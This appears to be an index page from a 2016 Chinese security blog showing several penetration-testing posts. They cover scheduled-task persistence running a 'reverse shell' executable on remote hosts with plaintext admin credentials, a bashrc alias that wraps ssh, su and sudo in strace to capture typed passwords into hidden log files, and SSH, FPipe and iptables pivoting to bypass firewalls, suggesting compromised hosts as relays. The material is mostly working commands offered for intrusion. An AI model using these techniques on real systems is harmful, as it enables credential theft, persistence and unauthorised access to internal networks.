<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="知道自己想要做什么,比怎么做更重要">
    

    <!--Author-->
    
        <meta name="author" content="klion">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="klion&#39;s blog"/>
    

    <!--Open Graph Description-->
    
        <meta property="og:description" content="知道自己想要做什么,比怎么做更重要" />
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="klion&#39;s blog"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>page - klion&#39;s blog</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    主页
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    所有文章
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    关于自己
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    标签
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    分类
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    一起交流
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">klion's blog</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/09/23/time-tasks/">
                win计划任务小记
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-09-23</span>
            
            
            
                <span class="category">
                    <a href="/categories/schtasks/">schtasks</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h4 id="1-关于系统计划任务的一些简单使用-03以前的系统中可使用-at-来执行各种系统计划任务"><a href="#1-关于系统计划任务的一些简单使用-03以前的系统中可使用-at-来执行各种系统计划任务" class="headerlink" title="1,关于系统计划任务的一些简单使用,03以前的系统中可使用 at 来执行各种系统计划任务"></a>1,关于系统计划任务的一些简单使用,03以前的系统中可使用 at 来执行各种系统计划任务</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># at 14:23 /every:18,19,21,24,28 c:\shell.exe  创建本地计划任务,每月的这几号的这个点执行指定的可执行程序</span></div><div class="line"><span class="comment"># at /delete /y 	删除本地所有的计划任务</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># at \\192.168.3.23 14:23 /every:18,19,21,24,28 c:\shell.exe 在远程机器上创建计划任务</span></div><div class="line"><span class="comment"># at \\192.168.3.23 /delete /y 删除远程机器上的所有的计划任务</span></div></pre></td></tr></table></figure>
<h4 id="2-如果是win7以后的系统可利用schtasks来执行各种计划任务-另外-如果是中文系统-可能还需要先改下字符集-不然会有些问题"><a href="#2-如果是win7以后的系统可利用schtasks来执行各种计划任务-另外-如果是中文系统-可能还需要先改下字符集-不然会有些问题" class="headerlink" title="2,如果是win7以后的系统可利用schtasks来执行各种计划任务,另外,如果是中文系统,可能还需要先改下字符集,不然会有些问题"></a>2,如果是win7以后的系统可利用schtasks来执行各种计划任务,另外,如果是中文系统,可能还需要先改下字符集,不然会有些问题</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># chcp 437</span></div></pre></td></tr></table></figure>
<p>在本地机器创建删除计划任务:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># schtasks /create /sc minute /mo 1 /tn "reverse shell" /tr c:\shell.exe</span></div><div class="line"><span class="comment"># schtask /query | findsrt "shell"</span></div><div class="line"><span class="comment"># schtasks /delete /tn "reverse shell" /F</span></div></pre></td></tr></table></figure></p>
<p>创建删除远程机器上的计划任务:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># schtasks /s 192.168.3.23 /u administrator /p admin!@#45 /create /sc minute /mo 1 /tn "update" /tr c:\shell.exe</span></div><div class="line"><span class="comment"># schtasks /s 192.168.3.23 /u administrator /p admin!@#45 /query | findstr update</span></div><div class="line"><span class="comment"># schtasks /s 192.168.3.23 /u administrator /p admin!@#45 /delete /tn "update" /F</span></div></pre></td></tr></table></figure></p>
<p><br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/09/22/strace/">
                利用strace来跟踪在ssh时输入的密码
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-09-22</span>
            
            
            
                <span class="category">
                    <a href="/categories/strace/">strace</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>strace本身其实是一个非常好用的系统调用跟踪工具,运维们可以通过它快速锁定问题的根源,但,恰巧我们也可以通过这种方式来跟踪任何进程数据,比如ssh,su,sudo,这里以跟踪密码为例,大家可以自行脑洞更多其它用法,关于strace自身的选项作用,请man:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum install strace 如果目标机器没有装strace,那你就自己顺手给他装一个,不过像这类的调试工具,一般都会作为常用工具而被预装</span></div><div class="line"><span class="comment"># vi ~/.bashrc 注意,这里是当前用户的环境变量配置文件,也就是说它只能对当前用户有效,不过你也可以加到全局配置中 '/etc/bashrc'</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alias</span> ssh=<span class="string">'strace -o /tmp/.sshpwd-`date '</span>+%d%h%m%s<span class="string">'`.log -s 2048 ssh'</span></div></pre></td></tr></table></figure>
<p><img src="/img/ssh rcode.png" alt=""><br></p>
<p>除了ssh,你也可以尝试跟踪su,sudo,不过,先暂时不要加,实际测试中还有些问题,待解决后再做说明<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alias</span> su=<span class="string">"strace -o /tmp/.su-`date '+%d%h%m%s'`.log su"</span></div><div class="line"><span class="keyword">alias</span> sudo=<span class="string">"strace -o /tmp/.sudo-`date '+%d%h%m%s'`.log sudo"</span></div><div class="line"><span class="comment"># source ~/.bashrc</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh root@192.168.3.41 -p 22</span></div></pre></td></tr></table></figure>
<p><img src="/img/ssh  ssh.png" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># cat .sshpwd-17May051494975433.log  | egrep "(read\(4).*\)"</span></div></pre></td></tr></table></figure>
<p><img src="/img/ssh  ssh res.png" alt=""><br><br><img src="/img/ssh  ssh res pass.png" alt=""><br></p>
<p><br></p>
<h5 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;一点小tip,顺手记录下,用来扩展机器确实蛮不错的,如果大家想深入研究,可以好好了解下strace工具自身的详细使用<br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/09/21/ssh-portforward/">
                通向彼岸 之内网代理转发 [ ssh正反向转发及socks代理篇 ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-09-21</span>
            
            
            
                <span class="category">
                    <a href="/categories/ssh-portforwd/">ssh portforwd</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h5 id="ssh端口转发-可以连续转发多个端口-这里只以转单个端口为例"><a href="#ssh端口转发-可以连续转发多个端口-这里只以转单个端口为例" class="headerlink" title="ssh端口转发(可以连续转发多个端口,这里只以转单个端口为例):"></a>ssh端口转发(可以连续转发多个端口,这里只以转单个端口为例):</h5><p><br></p>
<h5 id="ssh-命令选项作用简介-更多选项详情-请自行man-ssh-那里面确实说的非常详细"><a href="#ssh-命令选项作用简介-更多选项详情-请自行man-ssh-那里面确实说的非常详细" class="headerlink" title="ssh 命令选项作用简介[更多选项详情,请自行man ssh,那里面确实说的非常详细]:"></a>ssh 命令选项作用简介[更多选项详情,请自行man ssh,那里面确实说的非常详细]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">-C  压缩数据传输,加快传输速度</div><div class="line">-f  后台登录用户名密码</div><div class="line">-n  后台运行</div><div class="line">-q  安静模式,不要显示警告等信息</div><div class="line">-l  指定登录名</div><div class="line">-N  不执行shell通,主要用在转发中</div><div class="line">-g  允许远程主机连接到本地转发的端口     </div><div class="line">-L  本地端口转发</div><div class="line">-R  远程端口转发</div><div class="line">-D  socks代理</div><div class="line">-T  禁止分配伪终端</div><div class="line">-p  指定远程ssh 端口</div></pre></td></tr></table></figure>
<h4 id="在建立转发之前-我们需要先到中间人这台机器上去对ssh做些简单配置-记得配置完以后顺手重启服务-如下"><a href="#在建立转发之前-我们需要先到中间人这台机器上去对ssh做些简单配置-记得配置完以后顺手重启服务-如下" class="headerlink" title="在建立转发之前,我们需要先到中间人这台机器上去对ssh做些简单配置,记得配置完以后顺手重启服务,如下"></a>在建立转发之前,我们需要先到中间人这台机器上去对ssh做些简单配置,记得配置完以后顺手重启服务,如下</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/ssh/sshd_config</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PermitRootLogin yes  </div><div class="line">GatewayPorts yes</div><div class="line">TCPKeepAlive yes  保持心跳包,防止断开</div><div class="line">PasswordAuthentication yes</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># /etc/init.d/sshd restart</span></div></pre></td></tr></table></figure>
<h5 id="测试环境如下"><a href="#测试环境如下" class="headerlink" title="测试环境如下:"></a>测试环境如下:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">win <span class="number">2008</span>R2(远程机器) <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.23</span>(假设为公网ip)</div><div class="line">ubuntu <span class="number">14.04</span> LTS server(本地机器) <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">32.142</span>(假设为内网ip)</div><div class="line">centos <span class="number">6.8</span>(负责中间人的角色,实际测试中通常都是你的vps) <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.40</span>(假设为公网ip)</div><div class="line">win7(用来访问的的机器) <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">32.144</span>(假设为内网ip)</div></pre></td></tr></table></figure>
<p>1,事先在中间人的那台服务器(192.168.3.40)新建个伪用户 klion,等会ssh连接的时候要用,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># useradd -s /sbin/nologin klion</span></div><div class="line"><span class="comment"># echo "admin110" | passwd --stdin klion</span></div></pre></td></tr></table></figure></p>
<p>2,首先,我们来说本地转发,下面这句话的意思就是将本地机器的某个端口转发到指定的远程机器上的某个端口,既然是转发肯定少不了有个中间人,但这中间到底是通过谁转发呢,其实就是@后面的机器<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh -C -f -N -g -L [本地机器:]本地机器指定的端口:远程主机:远程主机指定的端口 tmpuser@中间人ssh服务器 -p 中间人ssh服务器端口</span></div></pre></td></tr></table></figure></p>
<p>为了更真实的模拟出环境,上面我是故意搞成这样的,假设本地机器和远程机器不能直接通信,但中间人那台机器可以和远程机器正常通信,我想做的事情也很简单,通过ssh在本地做转发,当有人访问我本地的1080端口时就转到远程机器的3389端口上,那语句就应该就是下面这么个样子:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh -C -f -N -g -L 1080:192.168.3.23:3389 klion@192.168.3.40 -p 22</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/ssh local.png" alt=""><br></p>
<p>这时,当你从别的机器去访问192.168.32.142这台机器的1080端口其实就相当于去访问192.168.3.23的3389端口,而帮你和远程机器建立这层联系的正是192.168.3.40这台机器,也就是所谓的ssh通道(隧道),既是ssh也就意味着在这个通道内的所有数据都应该是加密的,有时,你可以利用这种的方式来bypass掉目标的一些防火墙<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">在 <span class="number">192.168</span>.<span class="number">32.144</span> 这台机器上执行  mstsc <span class="number">192.168</span>.<span class="number">32.142</span><span class="symbol">:</span><span class="number">1080</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/ssh local res.png" alt=""><br><br><br></p>
<p>3,下面再来说远程转发(最好以root权限登录,因为直接在远程机器上侦听端口可能需要提供特权),如果你理解了本地转发,其实远程转发就更好理解了,本地转发有点儿类似我们的正向代理,而远程转发,则是完全相反的方向,类似我们的反向代理,正常情况下,公网是不能直接访问内网特定机器的(比如,被nat的原因),但你现在偏偏就有这样的需求,就想通过公网的某台机器作为中转来访问某个内网中的某台特定的机器,如果真是这样,你就可以像我接下来这样做<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh -C -f -N -g -R [本地机器:]本地机器指定端口:内网指定机器:内网指定机器的指定端口 root@中间人机器 -p 22</span></div></pre></td></tr></table></figure></p>
<p><br><br>现在就来简单模拟这一简单转发过程,首先,在我本地(192.168.32.142)已经事先起好了tomcat服务,我现在希望通过192.168.3.23(假设为公网ip)这台机器能直接访问到我内网的那台机器(192.168.32.142)的tomcat服务,怎么做呢,其实很简单,同样是通过192.168.3.40这台中转机器,直接把远程端口的流量转发到你本地机器上即可,语句如下:<br><br><br>通过访问192.168.3.40这台机器的1080端口就可以直接访问到我本机的8080端口了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh -C -f -N -g -R 0.0.0.0:1080:127.0.0.1:8080 root@192.168.3.40(一般是你自己的vps,肉鸡更佳) -p 22</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/ssh remote protfoward.png" alt=""><br><br><img src="/img/ssh remote protfoward res.png" alt=""><br></p>
<p><br></p>
<p>4,单纯(点对点)的端口转发搞定以后,我们再来看看如何利用ssh简单实现动态端口转发(socks代理),本地只需配合各种socks代理工具即可访问我不能直接访问到的一些资源(内网渗透可能已经用烂了),在前面的相关文章中就socks代理的代理基本细节已经重复说明过多次,这里就不再细说了,用ssh建立的socks 实际测试中4/5都可以<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">socks代理环境,如下:</div><div class="line">centos <span class="number">6.8</span>en(本地机器) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.40</span>(假设为公网ip)</div><div class="line">ubuntu <span class="number">14.04</span>en(中转机器) <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.41</span>(假设为公网ip)  <span class="number">192.168</span>.<span class="number">32.142</span>(假设为内网ip) </div><div class="line">win <span class="number">2008</span>R2cn(内网机器) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">32.134</span> (假设为内网ip)</div><div class="line">win <span class="number">7</span>cn(另外一台用来测试转发是否的成功的机器,用proxifier做socks代理连接测试) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.251</span></div></pre></td></tr></table></figure></p>
<p>目的:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">本地机器和中转机器能正常通信,但无法和内网机器直接通信,通过在本地机器动态转发直接访问内网机器</div></pre></td></tr></table></figure></p>
<p>下面的意思就是只要是本机666端口走的数据,全部都走和192.168.3.40建立好的ssh通道,再说的简单一点就是,我管127.0.0.1的666端口要东西,然后192.168.3.40去帮我把东西取回来,然后再丢到我这一头的666端口上我去拿,就这么简单,我自己不能直接访问的资源,我可以找个能访问那个资源的人来帮我拿回来,通俗点儿的理解就是这样<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh -qTfnN -D 0.0.0.0:1080 root@192.168.3.41 -p 22  这里我用的0.0.0.0 也就是说,我想让任意地址都能连进来,因为我等会儿要从192.168.3.251这台机器上用proxifier做代理连进去,实际中你可用proxychains代理进去也是一样</span></div><div class="line"><span class="comment"># plink.exe -C -N -D 127.0.0.1:666 root@192.168.3.40  在win平台中的putty自带的也有这么一个小功能</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/ssh socks loca.png" alt=""><br><br><img src="/img/ssh socks test rules.png" alt=""><br><br><img src="/img/ssh socks test.png" alt=""><br><br><img src="/img/ssh socks test_res.png" alt=""><br></p>
<p>5,另外,在实际转发过程中,可能会经常断线卡死,为了尽量避免这些问题,我们可以在ssh的时候加上下面的几个选项<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh -o ServerAliveInterval=20  -o ServerAliveCountMax=8 -o TCPKeepAlive=yes</span></div></pre></td></tr></table></figure></p>
<p>关于 ssh 正反向隧道在实际渗透中的简单用法:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">正向ssh隧道[本地访问目标边界服务器]:</div><div class="line"><span class="comment"># ssh -qTfnN -L 本地的端口:目标机器的ip:目标机器的指定端口 -l vps的系统用户名 vps的ip</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">反向ssh隧道[直接访问目标内网指定机器]:</div><div class="line"><span class="comment"># ssh -qTfnN -R 本地的端口:内网目标机器的ip:内网目标机器的指定端口 -l  vps的系统用户名 vps的ip</span></div></pre></td></tr></table></figure>
<p><br></p>
<h5 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;不光是在实际的渗透中我们可以利用ssh做类似的转发,平时也一样可以通过这种方式进行简单的传输数据加密,比如大家都知道ftp默认是明文传输的,账户密码很容易被抓到,但如果我们通过ssh转发让它走到ssh的通道内,岂不就可以起到一定的加密作用,有人比较纠结,说ssh转发并不是隧道,其实,大可不用太过纠结某些技术名词,真的不太重要,严格意义上来说,利用ssh转发,本质上就是把指定端口的流量封装在ssh里面再进行传输,这其实就是一种准隧道,唉,最关键的是你自己一定要能很理解问题的本质,这极度重要(别人跟你说一万遍,不如你自己完整做一遍,东西不过自己的心,始终都不会是你自己的,更不要说灵活应用了,多想多实现,切莫眼高手低),然后能把想干的事情干成就行,还是那句话,我们不是做学术研究,完全没要咬文嚼字,有些犯不着死扣的地方,非常死扣纯粹就是浪费时间,其实,这样对提高自己的实战能力,并没什么卵用,还是坚守自己一直以来的原则,一切从实际出发,说的天花乱坠,但很难把它应用到实战中,还不如不说,不是吗</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/09/20/fpipe-redirect-port/">
                通向彼岸 之内网代理转发 [ 利用端口重定向bypass各类应用层防火墙 fpipe ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-09-20</span>
            
            
            
                <span class="category">
                    <a href="/categories/fpipe/">fpipe</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;如果你觉得netsh和iptables配置稍微有点儿繁琐,有款小工具可能会适合你,fpipe 一款专门用于端口重定向的小工具,从名字就能猜出来它是干啥的,很明显,forward pipe[转发,通过管道],虽然功能上和netsh有一点点类似,但确实不是一类东西,同样是监听来自外部的某个端口,但它多做了一步,它会把来自外部端口的流量先转到本地某个指定的端口上(转发),再通过转到的这个本地端口去连远程机器的某个端口(管道),而不是像netsh只是单纯的把端口转过去,简易的通信流程如下</p>
<p>外部端口访问 &lt;-&gt; 本地监听来自外部的这个端口并它转到本地的另一个端口上(在本地绑定两个端口) &lt;-&gt; 通过本地的另一个端口和远程机器的某个端口通信 </p>
<p>工具选项如下,非常简单,看选项说明就懂了:<br><img src="/img/fpipe help.png" alt=""><br></p>
<p>1,我们可以拿它来做什么<br>&nbsp;&nbsp;&nbsp;&nbsp;刚刚在上面已经说过,它并非直接转发,而是又自己建立了一个新的通道,这样的好处在哪里呢,很明显,我们可以通过这样的方式来轻松bypass掉各类应用层防火墙</p>
<p>2,实验环境如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">边界机器(win2008en,防火墙已开启,且只允许<span class="number">80</span>进) <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.34</span>(假设为公网ip)   <span class="number">192.168</span>.<span class="number">32.143</span>(目标内网ip)</div><div class="line">目标内网的一台win机器(win2008r2cn) <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">32.134</span> </div><div class="line">目标内网的一台linux机器(centos <span class="number">6.8</span>en) <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">32.129</span> </div><div class="line">攻击者机器(win7cn) <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.251</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/firewall_win.png" alt=""><br><img src="/img/firewall_rules.png" alt=""><br></p>
<p>3,最终目的:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">已确认所有内网ip之间的通信没有任何问题</div><div class="line">攻击者通过边界机器的<span class="number">80</span>端口直接访问内网那台windows机器的远程桌面和另一台linux机器的ssh</div></pre></td></tr></table></figure></p>
<p>在边界的那台机器上执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># FPipe.exe -l 80 -s 1080 -r 3389 192.168.32.134 把来自外部的80端口的流量通过本地的1080端口转到内网192.168.32.134这台机器的3389端口上</span></div><div class="line"><span class="comment"># FPipe.exe -l 80 -s 1080 -r 22 192.168.32.129   把来自外部的80端口的流量通过本地的1080端口转到内网192.168.32.129这台机器的22端口上</span></div></pre></td></tr></table></figure></p>
<p>此时,回到入侵者的机器上执行,这样就可以直接连到内网的那两台机器了,虽然边界机器确实是开了防火墙,但只要你有一个可以通过的端口,足矣:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># mstsc 192.168.3.34:80   在实际连rdp的时候,经常会断,不知为何,后期找到原因再来补充吧</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/fpipe_80_rdp.png" alt=""><br><img src="/img/fpipe_80_rdp_question.png" alt=""><br><img src="/img/fpipe_80_rdp_result.png" alt=""><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># putty 192.168.3.34:80  相反,ssh就非常稳定,我在想拿到是图形界面的原因</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/fpipe_80_ssh.png" alt=""><br><br><img src="/img/fpipe_80_ssh_res.png" alt=""><br><br><img src="/img/fpipe_80_ssh_connect.png" alt=""><br><br><br></p>
<h5 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;在实际渗透中,你可以在提权以后自己手工加一条允许某个端口的规则,注意建立管道绑的端口不要和系统中现有的端口冲突,用这个的主要原因还是希望能把内网中的一些出不来(不能连外网)的机器,通过这种方式一起给带出来,实际渗透中不一定非要用,实在没办法的时候可以尝试下,如果真是遇到那种什么都出不来的内网,好吧,算你走运,像类似的疑难杂症我们后续还会用大量的篇幅来说明,因为有很多我自己也没搞明白,正在学习中</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/09/19/iptables-portfward/">
                通向彼岸 之内网代理转发 [ 系统篇 iptables ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-09-19</span>
            
            
            
                <span class="category">
                    <a href="/categories/iptabbles/">iptabbles</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h4 id="作用和netsh差不多-这里就不废话了-直接看操作-还是同样的情况-只不过你此时拿下的是边界的一台linux服务器-依然想通过这台机器直接去访问内网的其它机器"><a href="#作用和netsh差不多-这里就不废话了-直接看操作-还是同样的情况-只不过你此时拿下的是边界的一台linux服务器-依然想通过这台机器直接去访问内网的其它机器" class="headerlink" title="作用和netsh差不多,这里就不废话了,直接看操作,还是同样的情况,只不过你此时拿下的是边界的一台linux服务器,依然想通过这台机器直接去访问内网的其它机器"></a>作用和netsh差不多,这里就不废话了,直接看操作,还是同样的情况,只不过你此时拿下的是边界的一台linux服务器,依然想通过这台机器直接去访问内网的其它机器</h4><p><br></p>
<p>1,环境大致如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">边界linux机器(centos <span class="number">6.8</span>en) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.40</span>(假设为目标机器的公网ip) <span class="number">192.168</span>.<span class="number">32.129</span>(假设为目标的内网ip) </div><div class="line">要访问的内网windows机器(win <span class="number">2008</span>r2cn) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">32.134</span> </div><div class="line">攻击者机器(win7cn): <span class="number">192.168</span>.<span class="number">3.251</span></div></pre></td></tr></table></figure></p>
<p>2,最终目的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过边界的linux机器访问内网中的windows机器上的服务</div></pre></td></tr></table></figure></p>
<p>3,具体过程如下,首先,编辑边界linux系统的路由转发配置文件,开启其路由转发功能<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># sed -i '/net.ipv4.ip_forward/ s/\(.*= \).*/\11/' /etc/sysctl.conf</span></div><div class="line"><span class="comment"># cat /etc/sysctl.conf | grep "net.ipv4.ip_forward"</span></div></pre></td></tr></table></figure></p>
